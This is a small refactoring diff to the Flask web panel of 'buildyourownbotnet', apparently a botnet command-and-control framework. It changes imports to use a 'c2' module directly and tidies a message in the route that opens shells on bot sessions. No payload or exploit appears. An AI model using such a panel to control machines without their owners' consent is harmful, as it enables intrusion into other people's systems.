@@ -11,7 +11,7 @@ from datetime import datetime
 from flask import current_app, Blueprint, flash, redirect, render_template, request, url_for, send_from_directory
 from flask_login import login_user, logout_user, current_user, login_required
 
-from buildyourownbotnet import client, server
+from buildyourownbotnet import client, c2
 from buildyourownbotnet.core.dao import file_dao, payload_dao, session_dao
 from buildyourownbotnet.users.forms import RegistrationForm, LoginForm, UpdateAccountForm
 from buildyourownbotnet.models import db, bcrypt, User, Session
@@ -91,11 +91,11 @@ def shell():
 
 	# validate session id is valid integer
 	if not session_uid:
-		flash("Invalid bot UID: " + session_uid)
+		flash("Invalid bot UID: {}".format(session_uid))
 		return redirect(url_for('main.sessions'))
 
 	# get current user sessions
-	owner_sessions = server.c2.sessions.get(current_user.username)
+	owner_sessions = c2.sessions.get(current_user.username)
 
 	# check if owner has any active sessions
 	if not owner_sessions:
